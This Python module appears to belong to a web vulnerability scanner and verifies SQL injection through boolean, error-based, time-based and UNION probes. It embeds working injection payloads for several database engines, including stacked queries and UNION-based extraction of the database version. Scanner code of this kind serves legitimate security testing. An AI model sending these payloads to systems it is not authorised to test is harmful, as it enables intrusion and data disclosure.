"""
SQL Injection Verifier: Active verification for SQL injection vulnerabilities.

Implements:
- Boolean-based differential testing
- Error-based detection
- Time-based blind SQLi
- UNION-based testing
- Differential analysis
"""

import asyncio
import logging
from typing import Optional

from app.core.detectors.base_detector import Finding
from app.core.verification.response_analyzer import ResponseAnalyzer, ResponseData
from app.core.verification.verification_framework import (
    BaseVerifier,
    HttpVerifier,
    URLParameterBuilder,
    VerificationResult,
)
from app.models.vulnerability import OwaspCategory, SeverityLevel

logger = logging.getLogger(__name__)


class SQLiVerifier(BaseVerifier):
    """Verifies SQL injection vulnerabilities through active testing."""

    def __init__(self, timeout_seconds: float = 10.0):
        super().__init__(timeout_seconds)
        self.timeout_seconds = timeout_seconds

    async def verify(
        self,
        url: str,
        parameter: str,
        method: str = "GET",
        value: str = "",
    ) -> VerificationResult:
        """
        Execute comprehensive SQL injection verification.

        Runs multiple verification techniques:
        1. Boolean-based differential
        2. Error-based
        3. Time-based blind
        4. UNION-based

        Returns:
            VerificationResult with highest confidence finding
        """
        results = []

        # Try boolean-based first (fastest)
        bool_result = await self._verify_boolean_based(url, parameter, method, value)
        if bool_result.is_vulnerable:
            results.append(bool_result)

        # Try error-based (quick)
        error_result = await self._verify_error_based(url, parameter, method, value)
        if error_result.is_vulnerable:
            results.append(error_result)

        # Try UNION-based (medium complexity)
        union_result = await self._verify_union_based(url, parameter, method, value)
        if union_result.is_vulnerable:
            results.append(union_result)

        # Try time-based blind (slower, only if others fail)
        if not results:
            time_result = await self._verify_time_based(url, parameter, method, value)
            if time_result.is_vulnerable:
                results.append(time_result)

        # Return best result or aggregate
        if results:
            # Sort by confidence descending
            results.sort(key=lambda r: r.confidence_score, reverse=True)
            best = results[0]

            # Merge all findings into best result
            for r in results[1:]:
                best.findings.extend(r.findings)
                best.evidence.update(r.evidence)

            return best

        # No vulnerability found
        return VerificationResult(
            is_vulnerable=False,
            confidence_score=0.0,
            detection_method="none",
            findings=[],
            evidence={},
        )

    async def _verify_boolean_based(
        self,
        url: str,
        parameter: str,
        method: str,
        value: str,
    ) -> VerificationResult:
        """
        Verify via boolean-based blind SQL injection.

        Compares:
        - Baseline request
        - Request with ' AND 1=1--
        - Request with ' AND 1=2--
        """
        try:
            # Get baseline response
            baseline_url, baseline_params, baseline_data = URLParameterBuilder.inject_parameter(
                url, parameter, value, method
            )
            baseline = await self.http_verifier.send_request(baseline_url, method, baseline_params, baseline_data)

            # Get true condition response
            true_payload = "' AND 1=1--"
            true_url, true_params, true_data = URLParameterBuilder.inject_parameter(
                url, parameter, true_payload, method
            )
            true_resp = await self.http_verifier.send_request(true_url, method, true_params, true_data)

            # Get false condition response
            false_payload = "' AND 1=2--"
            false_url, false_params, false_data = URLParameterBuilder.inject_parameter(
                url, parameter, false_payload, method
            )
            false_resp = await self.http_verifier.send_request(false_url, method, false_params, false_data)

            # Analyze
            is_vulnerable, analysis = ResponseAnalyzer.analyze_boolean_differential(
                baseline, true_resp, false_resp
            )

            if is_vulnerable:
                confidence = 75.0  # HIGH confidence for reproducible boolean-based
                finding = self._create_finding(
                    category=OwaspCategory.a03,
                    vuln_type="SQL Injection (Boolean-Based Blind)",
                    severity=SeverityLevel.high,
                    url=url,
                    parameter=parameter,
                    payload=true_payload,
                    evidence=f"True/false conditions produce different responses. True similarity: {analysis['baseline_similarity_to_true']:.2f}, False similarity: {analysis['baseline_similarity_to_false']:.2f}",
                    confidence_score=confidence,
                    detection_method="boolean_differential",
                    method=method,
                    detection_evidence={"boolean_analysis": analysis},
                    reproducible=True,
                    verified=True,
                    verification_request_snippet=true_resp.request_snippet,
                    verification_response_snippet=true_resp.response_snippet,
                )
                return VerificationResult(
                    is_vulnerable=True,
                    confidence_score=confidence,
                    detection_method="boolean_differential",
                    findings=[finding],
                    evidence=analysis,
                    reproducible=True,
                )

            return VerificationResult(
                is_vulnerable=False,
                confidence_score=0.0,
                detection_method="boolean_differential",
                findings=[],
                evidence=analysis,
            )

        except Exception as e:
            logger.error(f"Boolean-based verification failed for {url}:{parameter}: {e}")
            return VerificationResult(
                is_vulnerable=False,
                confidence_score=0.0,
                detection_method="boolean_differential",
                findings=[],
                evidence={"error": str(e)},
            )

    async def _verify_error_based(
        self,
        url: str,
        parameter: str,
        method: str,
        value: str,
    ) -> VerificationResult:
        """
        Verify via error-based SQL injection.

        Sends payloads designed to trigger SQL errors.
        """
        error_payloads = [
            # Generic quote/escape error trigger
            "'",
            "\"",
            "`)",
            # MySQL Error-based (XML)
            "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
            "' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--",
            # PostgreSQL Error-based (cast)
            "' AND CAST((SELECT version())::text AS NUMERIC)--",
            # MSSQL Error-based (cast)
            "' AND CAST(@@version AS INT)--",
            # Oracle Error-based (UTL_INADDR)
            "' AND ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))--",
            # SQLite Error-based
            "' AND abs(-9223372036854775808)--",
        ]

        try:
            # Get baseline to compare against
            baseline_url, baseline_params, baseline_data = URLParameterBuilder.inject_parameter(
                url, parameter, value, method
            )
            baseline = await self.http_verifier.send_request(baseline_url, method, baseline_params, baseline_data)
            baseline_errors = ResponseAnalyzer.detect_sql_errors(baseline.body)

            # Try error payloads
            for payload in error_payloads:
                injected_url, injected_params, injected_data = URLParameterBuilder.inject_parameter(
                    url, parameter, payload, method
                )
                injected = await self.http_verifier.send_request(injected_url, method, injected_params, injected_data)

                # Check for SQL errors
                errors_detected = ResponseAnalyzer.detect_sql_errors(injected.body)
                new_errors = [e for e in errors_detected if e not in baseline_errors]

                if new_errors:
                    confidence = 85.0  # Very high for error-based
                    finding = self._create_finding(
                        category=OwaspCategory.a03,
                        vuln_type="SQL Injection (Error-Based)",
                        severity=SeverityLevel.critical,
                        url=url,
                        parameter=parameter,
                        payload=payload,
                        evidence=f"SQL error detected: {', '.join(new_errors)}",
                        confidence_score=confidence,
                        detection_method="error_based",
                        method=method,
                        detection_evidence={
                            "errors_detected": new_errors,
                            "baseline_errors": baseline_errors,
                            "injected_response_snippet": injected.body[:500],
                        },
                        reproducible=True,
                        verified=True,
                        verification_request_snippet=injected.request_snippet,
                        verification_response_snippet=injected.response_snippet,
                    )
                    return VerificationResult(
                        is_vulnerable=True,
                        confidence_score=confidence,
                        detection_method="error_based",
                        findings=[finding],
                        evidence={"errors": new_errors},
                        reproducible=True,
                    )

            return VerificationResult(
                is_vulnerable=False,
                confidence_score=0.0,
                detection_method="error_based",
                findings=[],
                evidence={"baseline_errors": baseline_errors},
            )

        except Exception as e:
            logger.error(f"Error-based verification failed for {url}:{parameter}: {e}")
            return VerificationResult(
                is_vulnerable=False,
                confidence_score=0.0,
                detection_method="error_based",
                findings=[],
                evidence={"error": str(e)},
            )

    async def _verify_time_based(
        self,
        url: str,
        parameter: str,
        method: str,
        value: str,
    ) -> VerificationResult:
        """
        Verify via time-based blind SQL injection.

        Sends payloads with SLEEP/pg_sleep and measures response time.
        """
        sleep_payloads = [
            # MySQL sleep
            ("' AND SLEEP(3)--", 3000),
            # PostgreSQL sleep
            ("'; SELECT pg_sleep(3)--", 3000),
            # MSSQL waitfor
            ("'; WAITFOR DELAY '0:0:3'--", 3000),
            # SQLite heavy query timing (benchmark)
            ("' AND (SELECT 1 FROM (SELECT(SLEEP(3)))x)--", 3000),
            # Stacked query timing
            ("'; SELECT SLEEP(3);--", 3000),
            ("'; pg_sleep(3);--", 3000),
        ]

        try:
            # Get baseline response times (3 requests)
            baseline_url, baseline_params, baseline_data = URLParameterBuilder.inject_parameter(
                url, parameter, value, method
            )

            baseline_times = []
            for _ in range(3):
                resp = await self.http_verifier.send_request(baseline_url, method, baseline_params, baseline_data)
                baseline_times.append(resp.response_time_ms)
                await asyncio.sleep(0.1)  # Small delay between requests

            # Try each sleep payload
            for payload, expected_delay_ms in sleep_payloads:
                injected_url, injected_params, injected_data = URLParameterBuilder.inject_parameter(
                    url, parameter, payload, method
                )

                injected_times = []
                for _ in range(2):
                    resp = await self.http_verifier.send_request(injected_url, method, injected_params, injected_data)
                    injected_times.append(resp.response_time_ms)
                    await asyncio.sleep(0.1)

                # Analyze timing
                is_significant, timing_analysis = ResponseAnalyzer.is_timing_significant(
                    baseline_times, injected_times, threshold_ms=expected_delay_ms * 0.8
                )

                if is_significant:
                    confidence = 70.0  # MEDIUM-HIGH for time-based
                    finding = self._create_finding(
                        category=OwaspCategory.a03,
                        vuln_type="SQL Injection (Time-Based Blind)",
                        severity=SeverityLevel.high,
                        url=url,
                        parameter=parameter,
                        payload=payload,
                        evidence=f"Response delayed {timing_analysis['diff_ms']:.0f}ms with sleep payload (baseline: {timing_analysis['baseline_mean']:.0f}ms, injected: {timing_analysis['injected_mean']:.0f}ms)",
                        confidence_score=confidence,
                        detection_method="time_based",
                        method=method,
                        detection_evidence=timing_analysis,
                        reproducible=True,
                        verified=True,
                        verification_request_snippet=resp.request_snippet,
                        verification_response_snippet=resp.response_snippet,
                    )
                    return VerificationResult(
                        is_vulnerable=True,
                        confidence_score=confidence,
                        detection_method="time_based",
                        findings=[finding],
                        evidence=timing_analysis,
                        reproducible=True,
                    )

            return VerificationResult(
                is_vulnerable=False,
                confidence_score=0.0,
                detection_method="time_based",
                findings=[],
                evidence={"baseline_times": baseline_times},
            )

        except Exception as e:
            logger.error(f"Time-based verification failed for {url}:{parameter}: {e}")
            return VerificationResult(
                is_vulnerable=False,
                confidence_score=0.0,
                detection_method="time_based",
                findings=[],
                evidence={"error": str(e)},
            )

    async def _verify_union_based(
        self,
        url: str,
        parameter: str,
        method: str,
        value: str,
    ) -> VerificationResult:
        """
        Verify via UNION-based SQL injection.

        Attempts to identify column count and extract data.
        """
        union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        ]

        try:
            # Get baseline
            baseline_url, baseline_params, baseline_data = URLParameterBuilder.inject_parameter(
                url, parameter, value, method
            )
            baseline = await self.http_verifier.send_request(baseline_url, method, baseline_params, baseline_data)

            # Try UNION payloads
            for payload in union_payloads:
                injected_url, injected_params, injected_data = URLParameterBuilder.inject_parameter(
                    url, parameter, payload, method
                )
                injected = await self.http_verifier.send_request(injected_url, method, injected_params, injected_data)

                # Analyze differential
                analysis = ResponseAnalyzer.analyze_differential(
                    baseline, injected, payload
                )

                # UNION injection usually produces no error but different response
                if analysis.is_significant_change and injected.status_code == 200:
                    # Successfully found column count! Now try to extract version
                    num_cols = payload.count("NULL")
                    version_extracted = None
                    version_payloads = [
                        "@@version", "version()", "sqlite_version()", "banner"
                    ]
                    
                    # Try to replace one of the NULLs with a version function
                    for v_pay in version_payloads:
                        for col_idx in range(num_cols):
                            cols = ["NULL"] * num_cols
                            cols[col_idx] = v_pay
                            injected_union = f"' UNION SELECT {','.join(cols)}--"
                            
                            ver_url, ver_params, ver_data = URLParameterBuilder.inject_parameter(
                                url, parameter, injected_union, method
                            )
                            ver_resp = await self.http_verifier.send_request(ver_url, method, ver_params, ver_data)
                            
                            body_lower = ver_resp.body.lower()
                            if any(indicator in body_lower for indicator in ["mysql", "postgres", "sqlite", "ubuntu", "debian", "mariadb", "microsoft"]):
                                version_extracted = ver_resp.body
                                payload = injected_union
                                break
                        if version_extracted:
                            break

                    confidence = 90.0 if version_extracted else 65.0
                    evidence_msg = f"Response changed with UNION payload. Similarity: {analysis.body_similarity:.2f}, Status: {injected.status_code}"
                    if version_extracted:
                        evidence_msg += f". Successfully extracted database version information via payload '{payload}'."

                    finding = self._create_finding(
                        category=OwaspCategory.a03,
                        vuln_type="SQL Injection (UNION-Based)",
                        severity=SeverityLevel.high,
                        url=url,
                        parameter=parameter,
                        payload=payload,
                        evidence=evidence_msg,
                        confidence_score=confidence,
                        detection_method="union_based",
                        method=method,
                        detection_evidence={
                            "similarity": analysis.body_similarity,
                            "status_code_changed": analysis.status_code_changed,
                            "response_length_changed": analysis.body_length_changed,
                            "version_extracted": bool(version_extracted),
                        },
                        reproducible=True if version_extracted else False,
                        verified=True,
                        verification_request_snippet=injected.request_snippet,
                        verification_response_snippet=injected.response_snippet,
                    )
                    return VerificationResult(
                        is_vulnerable=True,
                        confidence_score=confidence,
                        detection_method="union_based",
                        findings=[finding],
                        evidence={"analysis": analysis},
                        reproducible=True if version_extracted else False,
                    )

            return VerificationResult(
                is_vulnerable=False,
                confidence_score=0.0,
                detection_method="union_based",
                findings=[],
                evidence={},
            )

        except Exception as e:
            logger.error(f"UNION-based verification failed for {url}:{parameter}: {e}")
            return VerificationResult(
                is_vulnerable=False,
                confidence_score=0.0,
                detection_method="union_based",
                findings=[],
                evidence={"error": str(e)},
            )
